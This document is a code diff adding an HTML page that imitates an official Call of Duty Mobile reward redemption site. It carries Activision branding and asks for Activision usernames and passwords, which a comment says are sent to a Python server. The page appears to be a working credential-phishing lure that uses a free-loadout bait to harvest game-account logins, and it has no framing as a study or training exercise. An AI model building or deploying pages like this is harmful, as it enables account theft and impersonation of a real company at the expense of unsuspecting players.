@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Claim Your Loadout — CODM</title>
+<style>
+  :root {
+    --codm-bg: #0a0a0c;
+    --codm-panel: #141418;
+    --codm-panel-light: #1c1c22;
+    --codm-amber: #ffb800;
+    --codm-amber-glow: rgba(255, 184, 0, 0.4);
+    --codm-orange: #ff7a00;
+    --codm-border: rgba(255, 184, 0, 0.15);
+    --codm-border-focus: rgba(255, 184, 0, 0.5);
+    --codm-text: #e8e8e8;
+    --codm-text-dim: #8a8a8e;
+    --input-bg: rgba(255,255,255,0.03);
+  }
+
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Arial Narrow', 'Roboto Condensed', sans-serif;
+    background: var(--codm-bg);
+    color: var(--codm-text);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  /* Radial glow background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 800px 600px at 50% 30%, rgba(255, 122, 0, 0.08) 0%, transparent 70%),
+      radial-gradient(ellipse 600px 400px at 50% 80%, rgba(255, 184, 0, 0.04) 0%, transparent 60%),
+      var(--codm-bg);
+    z-index: 0;
+  }
+
+  /* Subtle scan-line texture */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent 0px,
+      transparent 3px,
+      rgba(255, 255, 255, 0.008) 3px,
+      rgba(255, 255, 255, 0.008) 4px
+    );
+    z-index: 1;
+    pointer-events: none;
+  }
+
+  /* Top bar */
+  .top-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 56px;
+    background: rgba(10, 10, 12, 0.95);
+    border-bottom: 1px solid var(--codm-border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 32px;
+    z-index: 10;
+    backdrop-filter: blur(10px);
+  }
+
+  .top-bar .logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 20px;
+    font-weight: 900;
+    text-transform: uppercase;
+    letter-spacing: 4px;
+    color: var(--codm-amber);
+    text-shadow: 0 0 20px var(--codm-amber-glow);
+  }
+
+  .top-bar .logo .cod {
+    color: var(--codm-text);
+    letter-spacing: 6px;
+  }
+
+  .top-bar .logo .mobile {
+    background: var(--codm-amber);
+    color: #000;
+    padding: 2px 10px;
+    font-size: 14px;
+    letter-spacing: 3px;
+    clip-path: polygon(0 0, 100% 0, 90% 100%, 0% 100%);
+  }
+
+  .top-bar .nav-links {
+    display: flex;
+    gap: 28px;
+    list-style: none;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+  }
+
+  .top-bar .nav-links a {
+    color: var(--codm-text-dim);
+    text-decoration: none;
+    transition: all 0.2s;
+    padding: 4px 0;
+    position: relative;
+  }
+
+  .top-bar .nav-links a:hover,
+  .top-bar .nav-links a.active {
+    color: var(--codm-amber);
+  }
+
+  .top-bar .nav-links a.active::after {
+    content: '';
+    position: absolute;
+    bottom: -6px;
+    left: 0;
+    right: 0;
+    height: 2px;
+    background: var(--codm-amber);
+    box-shadow: 0 0 10px var(--codm-amber);
+  }
+
+  /* Main container */
+  .claim-container {
+    position: relative;
+    z-index: 5;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* Panel */
+  .claim-panel {
+    background: linear-gradient(135deg, var(--codm-panel) 0%, var(--codm-panel-light) 100%);
+    border: 1px solid var(--codm-border);
+    clip-path: polygon(
+      20px 0,
+      100% 0,
+      100% calc(100% - 20px),
+      calc(100% - 20px) 100%,
+      0 100%,
+      0 20px
+    );
+    padding: 50px 80px 44px;
+    min-width: 480px;
+    text-align: center;
+    position: relative;
+    box-shadow:
+      0 0 60px rgba(255, 122, 0, 0.06),
+      inset 0 1px 0 rgba(255, 184, 0, 0.08);
+  }
+
+  .claim-panel::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 20px;
+    width: 60px;
+    height: 3px;
+    background: var(--codm-amber);
+    box-shadow: 0 0 12px var(--codm-amber-glow);
+  }
+
+  .claim-panel::after {
+    content: '';
+    position: absolute;
+    bottom: 0;
+    right: 20px;
+    width: 60px;
+    height: 3px;
+    background: var(--codm-amber);
+    box-shadow: 0 0 12px var(--codm-amber-glow);
+  }
+
+  /* Reward icon area */
+  .reward-icon {
+    width: 80px;
+    height: 80px;
+    margin: 0 auto 24px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .reward-icon svg {
+    width: 100%;
+    height: 100%;
+    filter: drop-shadow(0 0 15px var(--codm-amber-glow));
+  }
+
+  /* Section label */
+  .section-label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 5px;
+    color: var(--codm-amber);
+    margin-bottom: 12px;
+    font-weight: 700;
+    opacity: 0.9;
+  }
+
+  /* Main heading */
+  .claim-container h1 {
+    font-size: 42px;
+    font-weight: 900;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    line-height: 1.1;
+    margin-bottom: 12px;
+    color: var(--codm-text);
+    text-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
+  }
+
+  .claim-container h1 .accent {
+    color: var(--codm-amber);
+    text-shadow: 0 0 30px var(--codm-amber-glow);
+  }
+
+  /* Subtitle */
+  .subtitle {
+    font-size: 14px;
+    color: var(--codm-text-dim);
+    letter-spacing: 1px;
+    margin-bottom: 36px;
+    line-height: 1.5;
+    max-width: 380px;
+  }
+
+  /* Divider */
+  .divider {
+    width: 100%;
+    height: 1px;
+    background: linear-gradient(90deg, transparent 0%, var(--codm-border) 50%, transparent 100%);
+    margin-bottom: 26px;
+  }
+
+  /* Form */
+  .claim-form {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+    margin-bottom: 28px;
+  }
+
+  .input-group {
+    position: relative;
+    text-align: left;
+  }
+
+  .input-group label {
+    display: block;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    color: var(--codm-text-dim);
+    margin-bottom: 8px;
+    font-weight: 700;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 14px 18px;
+    font-size: 15px;
+    font-family: inherit;
+    background: var(--input-bg);
+    border: 1px solid var(--codm-border);
+    color: var(--codm-text);
+    outline: none;
+    transition: all 0.2s ease;
+    letter-spacing: 1px;
+    clip-path: polygon(
+      8px 0,
+      100% 0,
+      100% calc(100% - 8px),
+      calc(100% - 8px) 100%,
+      0 100%,
+      0 8px
+    );
+  }
+
+  .input-group input::placeholder {
+    color: var(--codm-text-dim);
+    opacity: 0.5;
+    letter-spacing: 1px;
+  }
+
+  .input-group input:focus {
+    border-color: var(--codm-border-focus);
+    box-shadow: 0 0 20px rgba(255, 184, 0, 0.15);
+    background: rgba(255, 184, 0, 0.03);
+  }
+
+  /* Claim button */
+  .claim-btn {
+    display: inline-block;
+    padding: 16px 56px;
+    font-size: 18px;
+    font-weight: 800;
+    text-transform: uppercase;
+    letter-spacing: 4px;
+    color: #000;
+    background: linear-gradient(135deg, var(--codm-amber) 0%, var(--codm-orange) 100%);
+    border: none;
+    cursor: pointer;
+    clip-path: polygon(
+      12px 0,
+      100% 0,
+      calc(100% - 12px) 100%,
+      0 100%
+    );
+    transition: all 0.25s ease;
+    box-shadow:
+      0 0 30px rgba(255, 184, 0, 0.3),
+      inset 0 1px 0 rgba(255, 255, 255, 0.25);
+    position: relative;
+    font-family: inherit;
+    width: 100%;
+  }
+
+  .claim-btn:hover {
+    box-shadow:
+      0 0 50px rgba(255, 184, 0, 0.6),
+      inset 0 1px 0 rgba(255, 255, 255, 0.35);
+    transform: translateY(-1px);
+    filter: brightness(1.1);
+  }
+
+  .claim-btn:active {
+    transform: translateY(1px);
+    filter: brightness(0.95);
+  }
+
+  @keyframes pulse-glow {
+    0%, 100% { box-shadow: 0 0 30px rgba(255, 184, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.25); }
+    50% { box-shadow: 0 0 45px rgba(255, 184, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.3); }
+  }
+
+  .claim-btn {
+    animation: pulse-glow 3s ease-in-out infinite;
+  }
+
+  /* Footer */
+  .footer {
+    position: fixed;
+    bottom: 16px;
+    left: 0;
+    right: 0;
+    text-align: center;
+    font-size: 11px;
+    color: var(--codm-text-dim);
+    letter-spacing: 1px;
+    z-index: 10;
+    opacity: 0.5;
+  }
+
+  /* Decorative side lines */
+  .side-deco {
+    position: fixed;
+    width: 2px;
+    height: 60px;
+    background: linear-gradient(180deg, transparent 0%, var(--codm-amber) 50%, transparent 100%);
+    opacity: 0.3;
+    z-index: 3;
+  }
+
+  .side-deco.left { left: 40px; top: 50%; transform: translateY(-50%); }
+  .side-deco.right { right: 40px; top: 50%; transform: translateY(-50%); }
+
+  /* Hexagon decoration */
+  .hex-deco {
+    position: fixed;
+    width: 120px;
+    height: 120px;
+    opacity: 0.03;
+    z-index: 2;
+  }
+
+  .hex-deco.top-left { top: 80px; left: 60px; }
+  .hex-deco.bottom-right { bottom: 60px; right: 60px; }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    .top-bar { padding: 0 16px; }
+    .top-bar .nav-links { display: none; }
+    .claim-panel {
+      min-width: auto;
+      width: 92vw;
+      padding: 40px 24px 34px;
+    }
+    .claim-container h1 { font-size: 32px; }
+    .claim-btn { padding: 14px 40px; font-size: 16px; }
+    .hex-deco, .side-deco { display: none; }
+  }
+</style>
+</head>
+<body>
+
+  <!-- Top navigation bar -->
+  <div class="top-bar">
+    <div class="logo">
+      <span class="cod">CALL OF DUTY</span>
+      <span class="mobile">M</span>
+    </div>
+    <ul class="nav-links">
+      <li><a href="#">Home</a></li>
+      <li><a href="#" class="active">Redeem</a></li>
+      <li><a href="#">Store</a></li>
+      <li><a href="#">Esports</a></li>
+      <li><a href="#">Support</a></li>
+    </ul>
+  </div>
+
+  <!-- Decorative hexagons -->
+  <svg class="hex-deco top-left" viewBox="0 0 100 100" fill="none" stroke="#ffb800" stroke-width="2">
+    <polygon points="50,5 92,27 92,73 50,95 8,73 8,27"/>
+  </svg>
+  <svg class="hex-deco bottom-right" viewBox="0 0 100 100" fill="none" stroke="#ffb800" stroke-width="2">
+    <polygon points="50,5 92,27 92,73 50,95 8,73 8,27"/>
+  </svg>
+
+  <!-- Side decorations -->
+  <div class="side-deco left"></div>
+  <div class="side-deco right"></div>
+
+  <!-- Main claim panel -->
+  <div class="claim-container">
+    <div class="claim-panel">
+
+      <!-- Reward icon -->
+      <div class="reward-icon">
+        <svg viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M40 6 L70 22 L70 58 L40 74 L10 58 L10 22 Z" stroke="#ffb800" stroke-width="2.5" fill="rgba(255,184,0,0.06)"/>
+          <path d="M40 6 L40 74 M10 22 L70 58 M70 22 L10 58" stroke="#ffb800" stroke-width="1" opacity="0.5"/>
+          <circle cx="40" cy="40" r="6" fill="#ffb800" opacity="0.8"/>
+        </svg>
+      </div>
+
+      <div class="section-label">Redemption Center</div>
+      <h1>Claim Your <span class="accent">Loadout</span></h1>
+      <p class="subtitle">Log in with your Activision account to claim your rewards.</p>
+
+      <div class="divider"></div>
+
+      <!-- Form POSTs to / which the Python server handles -->
+      <form class="claim-form" method="POST" action="/">
+        <div class="input-group">
+          <label for="username">Username / Email</label>
+          <input type="text" id="username" name="username" placeholder="Enter your Activision ID" autocomplete="username" required>
+        </div>
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
+        </div>
+
+        <button type="submit" class="claim-btn">Claim Rewards</button>
+      </form>
+
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">© 2025 Activision Publishing, Inc.</div>
+
+</body>
+</html>
